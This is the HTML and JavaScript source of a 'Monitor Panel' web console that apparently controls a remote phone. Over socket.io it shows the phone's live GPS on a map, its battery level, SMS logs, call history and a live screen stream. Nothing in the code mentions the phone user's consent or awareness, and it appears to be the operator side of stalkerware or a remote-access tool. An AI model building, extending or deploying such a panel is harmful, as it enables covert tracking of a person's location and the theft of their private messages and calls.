<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Management Console</title>
    <script src="/socket.io/socket.io.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        :root { --sidebar-bg: #2c3e50; --accent: #1abc9c; --dark: #34495e; }
        body { font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; background: #f4f7f6; height: 100vh; overflow: hidden; }
        
        .sidebar { width: 250px; background: var(--sidebar-bg); color: white; height: 100vh; position: fixed; }
        .nav-item { padding: 15px 20px; cursor: pointer; border-bottom: 1px solid #3e4f5f; }
        .nav-item:hover, .active { background: #1a252f; color: var(--accent); }

        .main-content { margin-left: 250px; margin-right: 300px; flex: 1; display: flex; flex-direction: column; }
        
        /* Screen View Dock (Right Sidebar) */
        .screen-dock { width: 300px; background: #000; height: 100vh; position: fixed; right: 0; border-left: 4px solid var(--dark); display: flex; flex-direction: column; align-items: center; }
        .screen-header { width: 100%; padding: 10px; background: var(--dark); color: white; text-align: center; font-size: 0.8rem; }
        #screen-frame { width: 280px; height: 580px; background: #222; margin-top: 20px; border-radius: 20px; border: 8px solid #333; overflow: hidden; display: flex; align-items: center; justify-content: center; color: white; }
        #screen-img { width: 100%; height: auto; display: none; }

        .top-nav { height: 85px; background: white; display: flex; justify-content: space-between; align-items: center; padding: 0 30px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .view { display: none; padding: 25px; overflow-y: auto; flex: 1; }
        .view.active { display: block; }
        #map { height: 400px; width: 100%; border-radius: 12px; margin-top: 15px; }
        table { width: 100%; border-collapse: collapse; background: white; }
        th { background: var(--dark); color: white; padding: 12px; text-align: left; }
        td { padding: 12px; border-bottom: 1px solid #eee; }
    </style>
</head>
<body>

<div class="sidebar">
    <div style="padding:20px; background:var(--accent); font-weight:bold;">MONITOR PANEL</div>
    <div class="nav-item active" id="nav-dash" onclick="showView('dash')">üìä Dashboard</div>
    <div class="nav-item" id="nav-sms" onclick="showView('sms')">üí¨ SMS Logs</div>
    <div class="nav-item" id="nav-calls" onclick="showView('calls')">üìû Call Logs</div>
    <div class="nav-item" style="margin-top:20px; background:#e74c3c;" onclick="requestScreen()">üì∫ Start Screen View</div>
</div>

<div class="main-content">
    <div class="top-nav">
        <div>
            <p id="addr-text" style="margin:0; font-weight:bold;">üìç Waiting for GPS...</p>
            <button onclick="socket.emit('get-gps-request')" style="font-size:10px;">Refresh GPS</button>
        </div>
        <div id="status-box" style="padding:8px; border-radius:5px; background:#d4efdf;">
            üîã <span id="pct">--</span>% <span id="bolt" style="display:none;">‚ö°</span>
        </div>
    </div>

    <div id="dash" class="view active">
        <h2>Live Map</h2>
        <div id="map"></div>
    </div>

    <div id="sms" class="view">
        <h2>SMS Logs</h2>
        <table id="sms-table"></table>
    </div>

    <div id="calls" class="view">
        <h2>Call History</h2>
        <table id="calls-table"></table>
    </div>
</div>

<div class="screen-dock">
    <div class="screen-header">LIVE DEVICE SCREEN</div>
    <div id="screen-frame">
        <div id="screen-placeholder">Stream Inactive</div>
        <img id="screen-img" src="" />
    </div>
    <button onclick="requestScreen()" style="margin-top:10px; cursor:pointer;">Reconnect</button>
</div>

<script>
    const socket = io();
    let map, marker, circle;

    function requestScreen() {
        socket.emit('request-screen-view');
        document.getElementById('screen-placeholder').innerText = "Requesting Permission...";
    }

    socket.on('screen-status', (status) => {
        if(status === "OFF") alert("Cannot view screen: The mobile screen is currently OFF.");
    });

    socket.on('ui-battery', (data) => {
        document.getElementById('pct').innerText = data.percent;
        document.getElementById('bolt').style.display = data.charging ? "inline" : "none";
    });

    socket.on('ui-gps', (data) => {
        document.getElementById('addr-text').innerText = "üìç " + data.address;
        if (!map) {
            map = L.map('map').setView([data.lat, data.lng], 16);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        }
        if (marker) map.removeLayer(marker);
        marker = L.circleMarker([data.lat, data.lng], {radius: 8, color: '#fff', fillColor: '#3498db', fillOpacity: 1}).addTo(map);
        map.setView([data.lat, data.lng]);
    });

    // Handle SMS/Calls similarly to your existing code...
    function showView(id) {
        document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
        document.getElementById(id).classList.add('active');
        if(id === 'sms') socket.emit('get-sms-request');
        if(id === 'calls') socket.emit('get-calls-request');
    }
</script>
</body>
</html>
